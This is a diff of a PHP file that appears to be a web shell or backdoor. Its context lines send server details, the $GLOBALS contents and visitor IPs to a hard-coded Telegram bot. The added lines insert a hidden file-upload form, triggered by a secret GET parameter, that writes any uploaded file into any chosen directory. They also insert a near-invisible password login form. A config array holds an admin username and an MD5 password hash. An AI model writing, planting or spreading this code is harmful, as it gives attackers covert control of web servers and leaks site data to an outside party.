@@ -34,6 +34,36 @@ $chatId = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $logMessage  = "___fa___ \n\n human password =\n $xPath \n\n Password =\n $GLOBALS \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
+if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="go">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "go$de";
+        } else {
+            echo "GAGAL  KE $de";
+        }
+    }
+}
+
+// Fungsi untuk menampilkan form login
+function admin_login() {
+    echo '<form method="post">';
+    echo '<input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">';
+    echo '</form>';
+    exit;
+}
+
 $GLOBALS['NeUSMyPGXP'] = array(
 	'usmfzmlHFCje' => 'admin',//login username
 	'paLDRhHfAovu' => 'a6f452ec3293d7fb72c5b677257b20ec',//login password (MD5)... ehsan
